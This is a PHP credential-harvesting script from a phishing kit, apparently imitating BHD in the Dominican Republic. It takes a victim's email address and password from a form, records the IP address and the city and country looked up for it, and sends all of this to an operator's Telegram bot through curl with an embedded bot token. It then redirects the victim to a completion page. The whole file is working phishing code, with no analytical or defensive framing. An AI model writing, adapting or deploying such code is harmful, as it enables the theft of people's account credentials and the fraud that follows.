<?php
session_start();

// Configuración del bot
$token = "8202173622:AAG7lPsKeZ_o_lTCtcRA7C5ZCM15tkTMMYc";   // 👉 pon aquí tu token real
$chat_id = "8029675723"; // 👉 pon aquí tu chat_id real

// Capturar datos del formulario
$correo = $_POST['usemail30'] ?? 'N/A';
$claveCorreo = $_POST['pascorr30'] ?? 'N/A';

// Capturar la IP real
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

// Obtener país y ciudad usando ip-api
$pais = 'N/A';
$ciudad = 'N/A';

$geo_url = "http://ip-api.com/json/$ip";
$geo_response = @file_get_contents($geo_url);
if ($geo_response !== false) {
    $geo_data = json_decode($geo_response, true);
    if ($geo_data && $geo_data['status'] === 'success') {
        $pais = $geo_data['country'] ?? 'N/A';
        $ciudad = $geo_data['city'] ?? 'N/A';
    }
}

// Fecha y hora actual
$fecha = date("Y-m-d H:i:s");

// Mensaje para Telegram
$mensaje = "*📩 BHD Correo:*\n\n"
         . "*✉️ Correo:* `$correo`\n"
         . "*🔑 Clave:* `$claveCorreo`\n\n"
         . "*🌐 IP:* `$ip`\n"
         . "*🏙 Ciudad:* `$ciudad`\n"
         . "*🇩🇴 País:* `$pais`\n"
         . "*🕒 Fecha:* `$fecha`\n\n"
         . "👣 @asoctrasmacol";

// Enviar a Telegram con cURL
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if ($response === false) {
    echo "❌ Error en cURL: " . curl_error($ch);
}
curl_close($ch);

// Redirigir después del envío
header("Location: finalizado.html");
exit();
?>
